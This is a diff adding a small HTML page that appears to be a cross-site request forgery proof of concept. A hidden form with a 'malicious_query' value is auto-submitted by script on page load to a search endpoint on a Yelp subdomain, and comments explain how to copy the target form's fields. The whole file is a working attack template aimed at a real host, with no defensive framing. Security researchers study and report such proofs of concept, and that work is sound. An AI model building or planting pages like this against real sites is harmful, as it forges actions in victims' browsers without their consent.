@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <form action="https://044121.yelp.com/search" method="POST">
+        <!-- Mimic any required fields here -->
+        <input type="hidden" name="search" value="malicious_query">
+        <!-- If applicable, mimic other fields from the original form -->
+        <button type="submit">Submit</button>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
